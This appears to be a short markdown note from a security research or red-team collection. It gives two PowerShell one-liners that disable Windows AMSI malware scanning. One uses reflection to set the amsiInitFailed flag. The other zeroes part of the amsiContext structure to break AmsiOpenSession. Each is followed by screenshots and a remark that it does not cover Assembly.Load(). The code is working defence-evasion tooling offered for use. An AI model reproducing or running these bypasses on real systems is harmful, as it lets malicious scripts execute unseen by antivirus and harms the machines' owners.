## Attack AmsiInitialize
Manipulate the initialized structure pointed out by `amsiContext` argument. 

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

![image](/screenshot/oneliner_init.jpg)

**Cannot bypass AMSI for Assembly.Load()**

![image](/screenshot/oneliner_init_dnet.jpg)

## Attack AmsiOpenSession
The 2nd QWORD of the structure pointed out by `amsiContext` argument is compared to `0`. Patch it to make the argument invalid.

```powershell
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```

![image](/screenshot/oneliner_opensession.jpg)

**Cannot bypass AMSI for Assembly.Load()**

![image](/screenshot/oneliner_opensession_dnet.jpg)
